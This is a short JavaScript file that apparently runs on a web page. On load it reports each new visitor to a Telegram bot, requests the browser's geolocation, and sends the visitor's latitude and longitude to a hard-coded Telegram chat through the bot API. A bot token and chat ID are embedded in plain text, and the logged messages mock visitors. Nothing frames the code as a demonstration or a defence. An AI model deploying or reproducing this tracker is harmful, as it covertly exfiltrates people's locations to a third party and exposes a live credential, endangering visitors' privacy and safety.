const telegramAPIToken = '432509966:AAFLcAiN7qqkL92cq2fDi1n9RJzha9LpW5s';
const chats = [116399511];

userOpenSite();
navigator.geolocation.getCurrentPosition(success, error);

function error(){
    sendMessageToTelegram("Users reject location, fuck him",chats[0]);
    window.console.log("error!");
}

function success(position) {
    sendMessageToTelegram("User allows location, nooob",chats[0]);
    const coord = {"lat":"","long":""};
    const latitude  = position.coords.latitude;
    const longitude = position.coords.longitude;
    coord.lat = latitude;
    coord.long = longitude;
    sendCoordToTelegram(coord);
    sendLocationToTelegram(latitude,longitude);
} 

function userOpenSite(){
    sendMessageToTelegram("New connection to the site",chats[0]);
}

function sendMessageToTelegram(message){

    const xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("GET", "https://api.telegram.org/bot432509966:AAFLcAiN7qqkL92cq2fDi1n9RJzha9LpW5s/sendMessage?chat_id="+chats[0]+"&text="+message);

    xhr.send();
}

function sendLocationToTelegram(lat,long){
    const xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("GET", "https://api.telegram.org/bot432509966:AAFLcAiN7qqkL92cq2fDi1n9RJzha9LpW5s/sendLocation?chat_id="+chats[0]+"&latitude="+lat+"&longitude="+long);

    xhr.send();
}

function sendCoordToTelegram(location){
    const message = "Lat: " + location.lat + " Long: " + location.long;
    const xhr = new XMLHttpRequest();
    xhr.withCredentials = true;
    xhr.open("GET", "https://api.telegram.org/bot432509966:AAFLcAiN7qqkL92cq2fDi1n9RJzha9LpW5s/sendMessage?chat_id="+chats[0]+"&text="+message);

    xhr.send();
}